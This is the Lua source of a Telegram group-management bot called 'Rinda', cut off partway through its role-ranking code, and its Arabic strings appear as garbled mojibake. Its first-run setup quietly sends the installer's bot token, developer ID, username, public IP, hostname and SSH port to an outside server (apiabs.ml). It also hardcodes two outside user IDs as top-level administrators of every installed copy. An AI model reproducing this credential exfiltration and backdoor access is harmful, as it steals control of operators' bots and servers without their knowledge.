------------------------------------------------
-- This Source Was Developed By (Rio) @tsttt.--
--   This Is The โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ @Source_Rinda .   --
--                - Rinda -                 --
--        -- https://t.me/Source_Rinda --         --
------------------------------------------------ 
DevRio  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local AutoSet = function() 
if not DevRio:get(Server.."IdRinda") then 
io.write('\27[1;35m\nุงูุงู ุงุฑุณู ุงูุฏู ุงููุทูุฑ ุงูุงุณุงุณู โข โค\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..DevId)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m-----------------------------------------\nุนุฐุฑุง ูุฐุง ุงูุงูุฏู ูุญุธูุฑ ูู ุชูุตูุจ ูุฐุง ุงูุณูุฑุณ\n-----------------------------------------') 
os.execute('lua Rinda.lua') 
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\27[1;36mุชู ุญูุธ ุงูุฏู ุงููุทูุฑ ุงูุงุณุงุณู\n27[0;39;49m') 
DevRio:set(Server.."IdRinda",DevId) 
end ---ifok
else 
print('\27[1;31m-----------------------------------------\nูู ูุชู ุญูุธ ุงูุฏู ุงููุทูุฑ ุงูุงุณุงุณู ุงุฑุณูู ุบูเขชูู\n-----------------------------------------') 
end
os.execute('lua Rinda.lua') 
end
end 
if not DevRio:get(Server.."TokenRinda") then 
io.write('\27[1;35m\nุงูุงู ูู ุจุงุฑุณุงู ุชููู ุงูุจูุช โข โค\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m-----------------------------------------\nุงูุชููู ุบูุฑ ุตุญูุญ ุชุงูุฏ ููู ุซู ุงุฑุณูู\n-----------------------------------------') 
else 
io.write('\27[1;36mุชู ุญูุธ ุชููู ุงูุจูุช ุถูุนู\n27[0;39;49m') 
DevRio:set(Server.."TokenRinda",TokenBot) 
end  
else 
print('\27[1;31m-----------------------------------------\nูู ูุชู ุญูุธ ุชููู ุงูุจูุช ุงุฑุณูู ุบูเขชูู\n-----------------------------------------') 
end  
os.execute('lua Rinda.lua') 
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevRio:get(Server.."IdRinda"),
TokenBot = DevRio:get(Server.."TokenRinda"),
Rinda = DevRio:get(Server.."TokenRinda"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdRinda")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdRinda").."&TokenBot="..DevRio:get(Server.."TokenRinda").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Rinda.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Rinda
token="]]..DevRio:get(Server.."TokenRinda")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "----------------------------------------- ----------------------------------------- โ โ โ โ โ"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "----------------------------------------- ----------------------------------------- โ โ โ โ โ"
exit 1
fi
if [ ! $token ]; then
echo "----------------------------------------- ----------------------------------------- โ โ โ โ โ โ โ"
echo "~ The Token Was Not Found In The config.lua File!"
echo "----------------------------------------- ----------------------------------------- โ โ โ โ โ โ โ"
exit 1
fi
./tg -s ./Rinda.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Rinda
while(true) do
rm -fr ../.telegram-cli
screen -S Rinda -X kill
screen -S Rinda ./Rinda.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_Rinda = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevRio:del(Server.."IdRinda");DevRio:del(Server.."TokenRinda")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_Rinda() 
print("\27[36m"..[[          
__________.__            .___      
\______   \__| ____    __| _/____   
|       _/  |/    \  / __ |\__  \   
|    |   \  |   |  \/ /_/ | / __ \_
|____|_  /__|___|  /\____ |(____  /
       \/        \/      \/     \/
]]..'\27[m'.."\n\27[35mServer Information โฌโฏ\n----------------------------------------- โ โ โ โ\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m----------------------------------------- โ โ โ โ\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,1558668590,1897626429}
Rinda = Config.Rinda
TokenBot = Config.TokenBot
NameBot = (DevRio:get(Rinda..'Rio:NameBot') or 'ุฑููุฏุง')
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
FilesPrint = "\27[35m".."\nAll Source Files Started โฌโฏ\n----------------------------------------- โ โ โ โ\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."----------------------------------------- โ โ โ โ\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function dl_cb(arg, data)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
-------  RioSudo  -------
function RioSudo(msg) 
local Status = DevRio:sismember(Rinda..'Rio:RioSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevRio:sismember(Rinda..'Rio:SecondSudo:',msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(Rinda) then  
var = true  
end  
return var  
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevRio:sismember(Rinda..'Rio:SudoBot:',msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐??c๐ค ๐ฑ๐๐ญd๐บ     --
----   RioConstructor   ----
function RioConstructor(msg) 
local Status = DevRio:sismember(Rinda..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----   Owner   ----
function Owner(msg) 
local Status = DevRio:sismember(Rinda..'Rio:Owner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioConstructor(msg) or SudoBot(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevRio:sismember(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevRio:sismember(Rinda..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or RioConstructor(msg) or BasicConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
---------  Manager  --------
function Manager(msg) 
local Status = DevRio:sismember(Rinda..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(Rinda..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(Rinda..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevRio:sismember(Rinda..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--------- CleanerNum ----------
function CleanerNum(msg) 
local Status = DevRio:sismember(Rinda..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--------- CleanerMusic ----------
function CleanerMusic(msg) 
local Status = DevRio:sismember(Rinda..'Rio:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevRio:sismember(Rinda..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
---------  BanAll  ---------
function BanAll(user_id)
if DevRio:sismember(Rinda..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevRio:sismember(Rinda..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevRio:sismember(Rinda..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function RindaFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Rinda and msg then
FilesText = plugin.Rinda(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function AddFileSource(msg,chat,ID_FILE,File_Name)
if File_Name:match('.lua') then
if File_Name ~= "Rinda.lua" then 
send(chat,msg.id_," โ๏ธฐูุฐุง ุงูููู ููุณ ุชุงุจุน ูุณูุฑุณ ุฑููุฏุง")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
os.execute('rm -rf Rinda.lua')
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"โ๏ธฐุนุฐุฑุง ุงูููู ููุณ ุจุตูุบุฉ โข Lua ูุฑุฌู ุฑูุน ุงูููู ุงูุตุญูุญ")
end      
send(chat,msg.id_,"โ๏ธฐุชู ุฑูุน ุงูููู ุงูุงู ุงุฑุณู ุชุญุฏูุซ ููุชู ุชุญุฏูุซ ุงูููู")
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= Rinda:lower() then 
send(chat,msg.id_,"โ๏ธฐุนุฐุฑุง ูุฐุง ุงูููู ููุณ ุชุงุจุน ููุฐุง ุงูุจูุช")   
return false 
end
send(chat,msg.id_,"โ๏ธฐุฌุงุฑู ุฑูุน ุงูููู ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"โ๏ธฐุนุฐุฑุง ุงูููู ููุณ ุจุตูุบุฉ โข Json ูุฑุฌู ุฑูุน ุงูููู ุงูุตุญูุญ")
end
local info_file = io.open('./'..Rinda..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevRio:set(Rinda.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(Rinda.."Rio:Groups",IdGps) 
DevRio:set(Rinda.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(Rinda.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(Rinda..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(Rinda..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('ุชู ุฑูุน ููุดุฆูู ุงููุฌููุนุงุช')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('ุชู ุฑูุน ( '..k..' ) ููุดุฆูู ุงุณุงุณููู')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(Rinda..'Rio:Constructor:'..IdGps,IdConstructors)  
print('ุชู ุฑูุน ( '..k..' ) ููุดุฆูู')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(Rinda..'Rio:Managers:'..IdGps,IdManagers)  
print('ุชู ุฑูุน ( '..k..' ) ูุฏุฑุงุก')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevRio:sadd(Rinda..'Rio:Admins:'..IdGps,IdAdmins)  
print('ุชู ุฑูุน ( '..k..' ) ุงุฏูููู')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(Rinda..'Rio:VipMem:'..IdGps,IdVips)  
print('ุชู ุฑูุน ( '..k..' ) ูููุฒูู')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(Rinda.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( ุชู ูุถุน ุฑูุงุจุท ุงููุฌููุนุงุช )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(Rinda.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( ุชู ูุถุน ุชุฑุญูุจ ุงููุฌููุนุงุช )')
end
end
end
send(chat,msg.id_,"โ๏ธฐุชู ุฑูุน ุงููุณุฎู ุถูุนู \nโ๏ธฐุชูุนู ุฌููุน ุงููุฌููุนุงุช \nโ๏ธฐุชู ุงุณุชุฑุฌุงุน ูุดุฑููู ุงููุฌููุนุงุช \nโ๏ธฐุชู ุงุณุชุฑุฌุงุน ุงูุงูุฑ ุงูููู ูุงููุชุญ ูู ุฌููุน ูุฌููุนุงุช ุงูุจูุช ")
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function Dev_Rio(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then RindaTeam  = "ุงููุทูุฑ" elseif RioSudo(msg) then RindaTeam = "ุงููุทูุฑ" elseif SecondSudo(msg) then RindaTeam = "ุงููุทูุฑ" elseif SudoBot(msg) then RindaTeam = "ุงููุทูุฑ" elseif Manager(msg) then RindaTeam = "ุงููุฏูุฑ" elseif Admin(msg) then RindaTeam = "ุงูุงุฏูู" else RindaTeam = "ุงูุนุถู" end return RindaTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then RindaTeam = 'ูุจุฑูุฌ ุงูุณูุฑุณ' elseif tonumber(user_id) == tonumber(1897626429) then RindaTeam = 'ูุจุฑูุฌ ุงูุณูุฑุณ' elseif tonumber(user_id) == tonumber(Rinda) then RindaTeam = 'ุงูุจูุช' elseif SudoId(user_id) then RindaTeam = 'ุงููุทูุฑ ุงูุงุณุงุณู' elseif DevRio:sismember(Rinda..'Rio:RioSudo:', user_id) then RindaTeam = 'ุงููุทูุฑ ุงูุงุณุงุณู' elseif DevRio:sismember(Rinda..'Rio:SecondSudo:', user_id) then RindaTeam = 'ุงููุทูุฑ ุงูุงุณุงุณูยฒ' elseif DevRio:sismember(Rinda..'Rio:SudoBot:', user_id) then RindaTeam = DevRio:get(Rinda.."Rio:SudoBot:Rd"..chat_id) or 'ุงููุทูุฑ' elseif DevRio:sismember(Rinda..'Rio:Owner:'..chat_id, user_id) then RindaTeam = DevRio:get(Rinda.."Rio:Owner:Rd"..chat_id) or 'ุงููุงูู' elseif DevRio:sismember(Rinda..'Rio:RioConstructor:'..chat_id, user_id) then RindaTeam = 'ุงููุงูู' elseif DevRio:sismember(Rinda..'Rio:BasicConstructor:'..chat_id, user_id) then RindaTeam = DevRio:get(Rinda.."Rio:BasicConstructor:Rd"..chat_id) or 'ุงูููุดุฆ ุงูุงุณุงุณู' elseif DevRio:sismember(Rinda..'Rio:Constructor:'..chat_id, user_id) then RindaTeam = DevRio:get(Rinda.."Rio:Constructor:Rd"..chat_id) or 'ุงูููุดุฆ' elseif DevRio:sismember(Rinda..'Rio:Managers:'..chat_id, user_id) then RindaTeam = DevRio:get(Rinda.."Rio:Managers:Rd"..chat_id) or 'ุงููุฏูุฑ' elseif DevRio:sismember(Rinda..'Rio:Admins:'..chat_id, user_id) then RindaTeam = DevRio:get(Rinda.."Rio:Admins:Rd"..chat_id) or 'ุงูุงุฏูู' elseif DevRio:sismember(Rinda..'Rio:VipMem:'..chat_id, user_id) then  RindaTeam = DevRio:get(Rinda.."Rio:VipMem:Rd"..chat_id) or 'ุงููููุฒ' elseif 